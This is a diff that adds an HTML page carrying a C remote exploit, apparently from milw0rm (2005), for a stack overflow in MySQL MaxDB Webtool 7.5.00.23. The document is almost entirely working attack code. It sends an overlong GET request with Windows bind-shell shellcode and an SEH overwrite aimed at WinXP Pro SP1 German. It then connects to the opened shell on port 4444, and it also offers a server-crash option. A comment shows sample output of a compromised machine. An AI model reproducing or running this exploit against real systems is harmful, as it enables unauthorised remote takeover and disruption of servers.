@@ -1,0 +1,347 @@
+<html>
+<head>
+<title>MySQL MaxDB Webtool <= 7.5.00.23 Remote Stack Overflow Exploit</title>
+<pre>
+/*
+ * MySQL MaxDB Webtool Remote Stack Overflow Exploit
+ *
+ * cybertronic[at]gmx[dot]net
+ *
+ * 04/27/2005
+ *               __              __                   _
+ *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
+ *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
+ * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
+ * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
+ *     /____/
+ *
+ * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
+ * --[ select target
+ * --[ 0 [0x100163d2] esi ebp ret
+ * --[ 1 [0xdeadc0de] crash server
+ *  &gt;&gt; 0
+ * --[ connecting to 192.168.2.103:9999...done!
+ * --[ sending packet [ 16383 bytes ]...done!
+ * --[ sleeping 5 seconds before connecting to 192.168.2.103:4444...
+ * --[ connecting to 192.168.2.103:4444...done!
+ * --[ b0x pwned - h4ve phun
+ * Microsoft Windows XP [Version 5.1.2600]
+ * (C) Copyright 1985-2001 Microsoft Corp.
+ *
+ * C:\WINDOWS\system32&gt;
+ * 
+ */
+
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+
+#define PORT	9999
+
+#define RED		&quot;\E[31m\E[1m&quot;
+#define GREEN	&quot;\E[32m\E[1m&quot;
+#define YELLOW	&quot;\E[33m\E[1m&quot;
+#define BLUE	&quot;\E[34m\E[1m&quot;
+#define NORMAL	&quot;\E[m&quot;
+
+/*
+ *
+ * prototypes
+ *
+ */
+
+int exploit ( int s, unsigned long ret );
+int isip ( char *ip );
+int shell ( int s, char* tip, unsigned short cbport );
+
+void connect_to_bindshell ( char* tip, unsigned short bport );
+void header ();
+void wait ( int sec );
+
+/*********************
+ * Windows Shellcode *
+ *********************/
+ 
+/* win32_bind */
+unsigned char bindshell[] =
+&quot;\x31\xc9\x83\xe9\xaf\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x92&quot;
+&quot;\x35\x88\x95\x83\xeb\xfc\xe2\xf4\x6e\x5f\x63\xda\x7a\xcc\x77\x6a&quot;
+&quot;\x6d\x55\x03\xf9\xb6\x11\x03\xd0\xae\xbe\xf4\x90\xea\x34\x67\x1e&quot;
+&quot;\xdd\x2d\x03\xca\xb2\x34\x63\x76\xa2\x7c\x03\xa1\x19\x34\x66\xa4&quot;
+&quot;\x52\xac\x24\x11\x52\x41\x8f\x54\x58\x38\x89\x57\x79\xc1\xb3\xc1&quot;
+&quot;\xb6\x1d\xfd\x76\x19\x6a\xac\x94\x79\x53\x03\x99\xd9\xbe\xd7\x89&quot;
+&quot;\x93\xde\x8b\xb9\x19\xbc\xe4\xb1\x8e\x54\x4b\xa4\x52\x51\x03\xd5&quot;
+&quot;\xa2\xbe\xc8\x99\x19\x45\x94\x38\x19\x75\x80\xcb\xfa\xbb\xc6\x9b&quot;
+&quot;\x7e\x65\x77\x43\xa3\xee\xee\xc6\xf4\x5d\xbb\xa7\xfa\x42\xfb\xa7&quot;
+&quot;\xcd\x61\x77\x45\xfa\xfe\x65\x69\xa9\x65\x77\x43\xcd\xbc\x6d\xf3&quot;
+&quot;\x13\xd8\x80\x97\xc7\x5f\x8a\x6a\x42\x5d\x51\x9c\x67\x98\xdf\x6a&quot;
+&quot;\x44\x66\xdb\xc6\xc1\x66\xcb\xc6\xd1\x66\x77\x45\xf4\x5d\x99\xc9&quot;
+&quot;\xf4\x66\x01\x74\x07\x5d\x2c\x8f\xe2\xf2\xdf\x6a\x44\x5f\x98\xc4&quot;
+&quot;\xc7\xca\x58\xfd\x36\x98\xa6\x7c\xc5\xca\x5e\xc6\xc7\xca\x58\xfd&quot;
+&quot;\x77\x7c\x0e\xdc\xc5\xca\x5e\xc5\xc6\x61\xdd\x6a\x42\xa6\xe0\x72&quot;
+&quot;\xeb\xf3\xf1\xc2\x6d\xe3\xdd\x6a\x42\x53\xe2\xf1\xf4\x5d\xeb\xf8&quot;
+&quot;\x1b\xd0\xe2\xc5\xcb\x1c\x44\x1c\x75\x5f\xcc\x1c\x70\x04\x48\x66&quot;
+&quot;\x38\xcb\xca\xb8\x6c\x77\xa4\x06\x1f\x4f\xb0\x3e\x39\x9e\xe0\xe7&quot;
+&quot;\x6c\x86\x9e\x6a\xe7\x71\x77\x43\xc9\x62\xda\xc4\xc3\x64\xe2\x94&quot;
+&quot;\xc3\x64\xdd\xc4\x6d\xe5\xe0\x38\x4b\x30\x46\xc6\x6d\xe3\xe2\x6a&quot;
+&quot;\x6d\x02\x77\x45\x19\x62\x74\x16\x56\x51\x77\x43\xc0\xca\x58\xfd&quot;
+&quot;\x62\xbf\x8c\xca\xc1\xca\x5e\x6a\x42\x35\x88\x95&quot;;
+
+unsigned char jmp1[] =
+&quot;\xeb\x08&quot;;
+
+unsigned char jmp2[] =
+&quot;\xe9\xe2\xf7\xff\xff&quot;; //jmp -2078
+
+/*
+ *
+ * structures
+ *
+ */
+
+struct targets {
+	int  num;
+	unsigned long ret;
+	char name[64];  
+}
+
+target[]= {
+	{ 0, 0x100163d2, &quot;WinXP Pro SP1 GER&quot; }, //tested working on my WinXP Pro SP1 box [ pop pop ret in wapi.dll ]
+	{ 1, 0xdeadc0de, &quot;crash server&quot; },
+};
+
+/*
+ *
+ * functions
+ *
+ */
+
+int
+exploit ( int s, unsigned long ret )
+{
+	char buffer[16384];
+
+	bzero ( &amp;buffer, sizeof ( buffer ) );
+	memset ( buffer, 0x90, sizeof ( buffer ) -13 );
+	strncpy ( buffer, &quot;GET /%&quot;, 6 );
+	memcpy ( buffer + 1600, bindshell, sizeof ( bindshell ) - 1 );
+	memcpy ( buffer + 3657, jmp1, sizeof ( jmp1 ) -1 );
+/*
+ *
+ * SEH offset changes for different binary path
+ * This exploits WinXP Pro SP1 GER asuming the
+ * default path of C:\Programme\sdb\programs\web\Documents
+ * englisch version is supported by metasploit
+ * http://www.metasploit.com/projects/Framework/modules/exploits/maxdb_webdbm_get_overflow.pm
+ *
+ */
+	strncpy ( buffer + 3661, ( unsigned char* ) &amp;ret, 4 );
+	memcpy ( buffer + 3673, jmp2, sizeof ( jmp2 ) -1 );
+	strncat ( buffer, &quot;HTTP/1.0\r\n\r\n&quot;, 12 );
+
+	printf ( &quot;--[ sending packet [ %u bytes ]...&quot;, strlen ( buffer ) );
+	if ( write ( s, buffer, strlen ( buffer ) ) &lt;= 0 )
+	{
+		printf ( RED &quot;failed!\n&quot; NORMAL);
+		return ( 1 );
+	}
+	printf ( YELLOW &quot;done!\n&quot; NORMAL);
+
+	return ( 0 );
+}
+
+int
+isip ( char *ip )
+{
+	int a, b, c, d;
+	
+	if ( !sscanf ( ip, &quot;%d.%d.%d.%d&quot;, &amp;a, &amp;b, &amp;c, &amp;d ) )
+		return ( 0 );
+	if ( a &lt; 1 )
+		return ( 0 );
+	if ( a &gt; 255 )
+		return 0;
+	if ( b &lt; 0 )
+		return 0;
+	if ( b &gt; 255 )
+		return 0;
+	if ( c &lt; 0 )
+		return 0;
+	if ( c &gt; 255 )
+		return 0;
+	if ( d &lt; 0 )
+		return 0;
+	if ( d &gt; 255 )
+		return 0;
+	return 1;
+}
+
+int
+shell ( int s, char* tip, unsigned short cbport )
+{
+	int n;
+	char buffer[2048];
+	fd_set fd_read;
+
+	printf ( &quot;--[&quot; YELLOW &quot; b&quot; NORMAL &quot;0&quot; YELLOW &quot;x &quot; NORMAL &quot;p&quot; YELLOW &quot;w&quot; NORMAL &quot;n&quot; YELLOW &quot;e&quot; NORMAL &quot;d &quot; YELLOW &quot;- &quot; NORMAL &quot;h&quot; YELLOW &quot;4&quot; NORMAL &quot;v&quot; YELLOW &quot;e &quot; NORMAL &quot;p&quot; YELLOW &quot;h&quot; NORMAL &quot;u&quot; YELLOW &quot;n&quot; NORMAL &quot;\n&quot; );
+
+	FD_ZERO ( &amp;fd_read );
+	FD_SET ( s, &amp;fd_read );
+	FD_SET ( 0, &amp;fd_read );
+
+	while ( 1 )
+	{
+		FD_SET ( s, &amp;fd_read );
+		FD_SET ( 0, &amp;fd_read );
+
+		if ( select ( s + 1, &amp;fd_read, NULL, NULL, NULL ) &lt; 0 )
+			break;
+		if ( FD_ISSET ( s, &amp;fd_read ) )
+		{
+			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) &lt; 0 )
+			{
+				printf ( &quot;bye bye...\n&quot; );
+				return;
+			}
+			if ( write ( 1, buffer, n ) &lt; 0 )
+			{
+				printf ( &quot;bye bye...\n&quot; );
+				return;
+			}
+		}
+		if ( FD_ISSET ( 0, &amp;fd_read ) )
+		{
+			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) &lt; 0 )
+			{
+				printf ( &quot;bye bye...\n&quot; );
+				return;
+			}
+			if ( send ( s, buffer, n, 0 ) &lt; 0 )
+			{
+				printf ( &quot;bye bye...\n&quot; );
+				return;
+			}
+		}
+		usleep(10);
+	}
+}
+
+void
+connect_to_bindshell ( char* tip, unsigned short bport )
+{
+	int s;
+	int sec = 5; // change this for fast targets
+	struct sockaddr_in remote_addr;
+	struct hostent *host_addr;
+
+	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
+	{
+		fprintf ( stderr, &quot;cannot resolve \&quot;%s\&quot;\n&quot;, tip );
+		exit ( 1 );
+	}
+
+	remote_addr.sin_family = AF_INET;
+	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr-&gt;h_addr );
+	remote_addr.sin_port   = htons ( bport );
+
+	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) &lt; 0 )
+    {
+		printf ( &quot;socket failed!\n&quot; );
+		exit ( 1 );
+	}
+	printf (&quot;--[ sleeping %d seconds before connecting to %s:%u...\n&quot;, sec, tip, bport );
+	wait ( sec );
+	printf ( &quot;--[ connecting to %s:%u...&quot;, tip, bport );
+	if ( connect ( s, ( struct sockaddr * ) &amp;remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
+	{
+		printf ( RED &quot;failed!\n&quot; NORMAL);
+		exit ( 1 );
+	}
+	printf ( YELLOW &quot;done!\n&quot; NORMAL);
+	shell ( s, tip, bport );
+}
+
+void
+header ()
+{
+	printf ( &quot;              __              __                   _           \n&quot; );
+	printf ( &quot;  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n&quot; );
+	printf ( &quot; / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n&quot; );
+	printf ( &quot;/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n&quot; );
+	printf ( &quot;\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n&quot; );
+	printf ( &quot;    /____/                                                     \n\n&quot; );
+	printf ( &quot;--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n&quot; );
+}
+
+void
+wait ( int sec )
+{
+	sleep ( sec );
+}
+
+int
+main ( int argc, char* argv[] )
+{
+	int s, targ, i;
+	struct sockaddr_in remote_addr;
+	struct hostent* host_addr;
+
+	if ( argc != 2 )
+	{
+		printf ( &quot;Usage: %s &lt;ip&gt;\n&quot;, argv[0] );
+		exit ( 1 );
+	}
+	system ( &quot;clear&quot; );
+	header ();
+	if ( !isip ( argv[1] ) )
+	{
+		printf ( &quot;Invalid Target IP!\n&quot; );
+		exit ( 1 );
+	}
+	printf(&quot;--[ select target\n&quot;);
+	for ( i = 0; i &lt; 2; i++ )
+		printf ( &quot;--[ %d [0x%08x] %s\n&quot;, target[i].num, target[i].ret, target[i].name );
+	printf ( &quot; &gt;&gt; &quot; );
+	scanf ( &quot;%d&quot;, &amp;targ );
+	if ( targ != 0 )
+		if ( targ != 1 )
+		{
+			printf ( &quot;--[ invalid target!\n&quot; );
+			exit ( 1 );
+		}
+	if ( ( host_addr = gethostbyname ( argv[1] ) ) == NULL )
+	{
+		fprintf ( stderr, &quot;cannot resolve \&quot;%s\&quot;\n&quot;, argv[1] );
+		exit ( 1 );
+	}
+	remote_addr.sin_family = AF_INET;
+	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr-&gt;h_addr );
+	remote_addr.sin_port   = htons ( PORT );
+
+	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) &lt; 0 )
+    {
+		printf ( &quot;socket failed!\n&quot; );
+		exit ( 1 );
+	}
+	printf ( &quot;--[ connecting to %s:%u...&quot;, argv[1], PORT  );
+	if ( connect ( s, ( struct sockaddr * ) &amp;remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
+	{
+		printf ( &quot;failed!\n&quot; );
+		exit ( 1 );
+	}
+	printf ( &quot;done!\n&quot; );
+	if ( exploit ( s, target[targ].ret ) == 1 )
+	{
+		printf ( &quot;exploitation FAILED!\n&quot; );
+		exit ( 1 );
+	}
+	close ( s );
+	connect_to_bindshell ( argv[1], 4444 );
+}
+
+// milw0rm.com [2005-04-27]
+</pre>
+</html>
+
